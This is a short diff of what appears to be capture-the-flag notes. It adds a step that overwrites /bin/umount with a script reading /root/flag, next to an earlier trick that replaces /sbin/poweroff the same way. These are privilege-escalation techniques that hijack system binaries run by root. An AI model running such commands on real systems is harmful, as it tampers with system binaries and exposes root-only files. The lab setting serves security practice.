@@ -13,6 +13,10 @@ ln -s flag /read_file.c
 # m1.1
 mv /sbin/poweroff /sbin/poweroff.bak
 echo "cat /flag" > /sbin/poweroff
+# m1.2
+echo "cat /root/flag">/bin/umount
+chmod +x /bin/umount
+exit
 ```
 
 # Basic
